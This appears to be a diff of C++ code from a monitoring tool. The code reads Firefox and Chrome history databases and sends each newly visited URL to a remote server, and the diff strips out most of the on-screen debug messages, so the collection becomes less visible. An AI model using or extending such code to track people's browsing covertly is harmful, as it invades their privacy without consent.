@@ -43,84 +43,65 @@ BOOL CWebHistory::Initialize(BYTE iBrowserType)
 BOOL CWebHistory::GetLastID()
 {
 	BOOL bRet = FALSE;
-	BOOL bFlag = FALSE;
-	if(m_bBrowserType == FIREFOX_BROWSER)
+
+	if (db.Open(m_strHistoryPath) == SQLITE_OK)
 	{
-		
-		if (!db.Open(m_strHistoryPath) == SQLITE_OK)
-		{
-			AfxMessageBox(_T("Truy xuat file database thu muc goc that bai"));
-			if (CMyUtils::CopyFile(m_strHistoryPath, m_strHistoryTempPath, FALSE))
-			{
-				if (!db.Open(m_strHistoryTempPath) == SQLITE_OK)
-				{
-					return FALSE;
-				}
-				else
-				{
-					AfxMessageBox(m_strHistoryTempPath);
-					bFlag = TRUE;
-				}
-			}
-			else
-			{
-				return FALSE;
-			}
-		}
-		else
-		{
-			AfxMessageBox(m_strHistoryPath);
-		}
-	}
-	else
-	{
-		if (CMyUtils::CopyFile(m_strHistoryPath, m_strHistoryTempPath, FALSE))
+		if (db.BeginTransaction())
 		{
 			
-			if (!db.Open(m_strHistoryTempPath) == SQLITE_OK)
+			CString strQuery;
+			strQuery.Format(_T("SELECT %s FROM %s ORDER BY %s DESC LIMIT 1"), m_strHistoryTableID, m_strHistoryTable, m_strHistoryTableID);
+			SQLite::TablePtr table = db.QuerySQL2(strQuery);
+			bRet = (db.GetLastError() == SQLITE_OK);
+			db.CommitTransaction();
+			if (bRet)
 			{
-				return FALSE;
+				if (table.m_pTable->GetRowCount() > 0)
+					m_strLastID = table.m_pTable->GetValue(0);
 			}
-			AfxMessageBox(m_strHistoryTempPath);
-			bFlag = TRUE;
+			table.Destroy();
+
 		}
-		else
+		db.Close();
+		if(bRet)
 		{
-			return FALSE;
+			AfxMessageBox(m_strHistoryPath);
+			wmemset(m_strHistoryTempPath, 0, MAX_PATH);
+			_stprintf(m_strHistoryTempPath, _T("%s"), m_strHistoryPath);
+			return bRet;
 		}
+	}
+
+
+	if (CMyUtils::CopyFile(m_strHistoryPath, m_strHistoryTempPath, FALSE))
+	{
+		if (db.Open(m_strHistoryTempPath) == SQLITE_OK)
+		{
+			if (db.BeginTransaction())
+			{
+				CString strQuery;
+				strQuery.Format(_T("SELECT %s FROM %s ORDER BY %s DESC LIMIT 1"), m_strHistoryTableID, m_strHistoryTable, m_strHistoryTableID);
+				SQLite::TablePtr table = db.QuerySQL2(strQuery);
+				bRet = (db.GetLastError() == SQLITE_OK);
+				db.CommitTransaction();
+				if (bRet)
+				{
+					if (table.m_pTable->GetRowCount() > 0)
+						m_strLastID = table.m_pTable->GetValue(0);
+				}
+				table.Destroy();
+			}
+			db.Close();
+		}
+		DeleteFile(m_strHistoryTempPath);
+		AfxMessageBox(m_strHistoryTempPath);
 
 	}
-	
-	if (db.BeginTransaction())
-	{
-		CString strQuery;
-		strQuery.Format(_T("SELECT %s FROM %s ORDER BY %s DESC LIMIT 1"), m_strHistoryTableID, m_strHistoryTable, m_strHistoryTableID);
-		AfxMessageBox(strQuery);
-		SQLite::TablePtr table = db.QuerySQL2(strQuery);
-		bRet = (db.GetLastError() == SQLITE_OK);
-		db.CommitTransaction();
-		if (bRet)
-		{
-			if (table.m_pTable->GetRowCount() > 0)
-				m_strLastID = table.m_pTable->GetValue(0);
-			CString strTemp(_T("Last ID: "));
-			strTemp.Append(m_strLastID);
-			AfxMessageBox(strTemp);
-		}
-		table.Destroy();
-	}
-	db.Close();
-	
-	if(bFlag)
-		DeleteFile(m_strHistoryTempPath);
-	
-	if(bRet)
-	{
-		AfxMessageBox(_T("Lay Last ID thanh cong"));
-	}
-	else AfxMessageBox(_T("Lay Last ID that bai"));
+
 	return bRet;
 }
+
+
 
 void CWebHistory::UpdateURL()
 {
@@ -129,59 +110,73 @@ void CWebHistory::UpdateURL()
 		m_bInit = Initialize(m_bBrowserType);
 		return;
 	}
-
-	if (CMyUtils::CopyFile(m_strHistoryPath, m_strHistoryTempPath, FALSE))
+	CString strTemp(_T("Update URL: "));
+	BOOL bFlag = FALSE;
+	if(wcscmp(m_strHistoryPath, m_strHistoryTempPath) != 0)
 	{
-		if (db.Open(m_strHistoryTempPath) == SQLITE_OK)
+		if(!CMyUtils::CopyFile(m_strHistoryPath, m_strHistoryTempPath, FALSE))
 		{
-			if (db.BeginTransaction())
-			{
-				CString strQuery,
-						strPreURL;
-				LPCTSTR strURL;
-				int		iRowCount,
-						i = 0;
-				if(m_bBrowserType == CHROME_BROWSER && !m_bOldVersionChrome)
-				{
-					strQuery.Format(_T("SELECT %s, %s FROM %s WHERE %s > %s ORDER BY %s ASC"),
-																		m_strHistoryTableID,
-																		m_strSelectName,
-																		m_strHistoryTable,
-																		m_strHistoryTableID,
-																		m_strLastID,
-																		m_strHistoryTableID);
-
-				}
-				else
-				{
-					strQuery.Format(_T("SELECT %s, %s FROM %s, %s WHERE %s = %s AND %s > %s ORDER BY %s ASC"), m_strHistoryTableID, m_strSelectName, m_strHistoryTable, m_strWebAddressTable, m_strHistoryTableWebID, m_strWebAddressTableID, m_strHistoryTableID, m_strLastID, m_strHistoryTableID);
-				}
-				
-				SQLite::TablePtr table = db.QuerySQL2(strQuery);
-				db.CommitTransaction();
-				
-				iRowCount = table.m_pTable->GetRowCount();
-				
-				while (i < iRowCount)
-				{
-					m_strLastID = table.m_pTable->GetValue(0);
-					strURL = table.m_pTable->GetValue(1);
-					if (strPreURL.CompareNoCase(strURL) != 0)
-					{
-						g_Connect.SendMsgToServer(VCM_WEB_HISTORY, 0, strURL );
-						AfxMessageBox(strURL);
-					}
-					strPreURL = strURL;
-					table.m_pTable->GoNext();
-					++i;
-				} 
-
-				table.Destroy();
-				db.Close();
-			}
+			return;
 		}
-		DeleteFile(m_strHistoryTempPath);
+		bFlag = TRUE;
 	}
+
+	
+	if (db.Open(m_strHistoryTempPath) == SQLITE_OK)
+	{
+		if (db.BeginTransaction())
+		{
+			
+			CString strQuery,
+					strPreURL;
+			LPCTSTR strURL;
+			int		iRowCount,
+					i = 0;
+			if(m_bBrowserType == CHROME_BROWSER && !m_bOldVersionChrome)
+			{
+				strQuery.Format(_T("SELECT %s, %s FROM %s WHERE %s > %s ORDER BY %s ASC"),
+																	m_strHistoryTableID,
+																	m_strSelectName,
+																	m_strHistoryTable,
+																	m_strHistoryTableID,
+																	m_strLastID,
+																	m_strHistoryTableID);
+
+			}
+			else
+			{
+				strQuery.Format(_T("SELECT %s, %s FROM %s, %s WHERE %s = %s AND %s > %s ORDER BY %s ASC"), m_strHistoryTableID, m_strSelectName, m_strHistoryTable, m_strWebAddressTable, m_strHistoryTableWebID, m_strWebAddressTableID, m_strHistoryTableID, m_strLastID, m_strHistoryTableID);
+			}
+			//strTemp.AppendFormat(_T("%s"), m_strHistoryTempPath);
+			//AfxMessageBox(strTemp);
+			SQLite::TablePtr table = db.QuerySQL2(strQuery);
+			db.CommitTransaction();
+			
+			iRowCount = table.m_pTable->GetRowCount();
+			
+			while (i < iRowCount)
+			{
+				m_strLastID = table.m_pTable->GetValue(0);
+				strURL = table.m_pTable->GetValue(1);
+				if (strPreURL.CompareNoCase(strURL) != 0)
+				{
+					g_Connect.SendMsgToServer(VCM_WEB_HISTORY, 0, strURL );
+					
+					//AfxMessageBox(strURL);
+				}
+				strPreURL = strURL;
+				table.m_pTable->GoNext();
+				++i;
+			} 
+
+			table.Destroy();
+			db.Close();
+		}
+	}
+
+	if(bFlag)
+		DeleteFile(m_strHistoryTempPath);
+	
 }
 
 
@@ -212,7 +207,7 @@ BOOL CWebHistory::InitializeForFirefox()
 			{
 				_stprintf(m_strHistoryTempPath, _T("%s\\FirefoxHistoryTemp.dat"), strPath);
 				m_bInit = TRUE;
-				AfxMessageBox(_T("Get temp path"));
+				//AfxMessageBox(_T("Get temp path"));
 			}
 		}
 	}
@@ -287,3 +282,4 @@ BOOL CWebHistory::InitializeForChrome( const BOOL& bOldVersion /*= FALSE*/ )
 	
 	return m_bInit;
 }
+
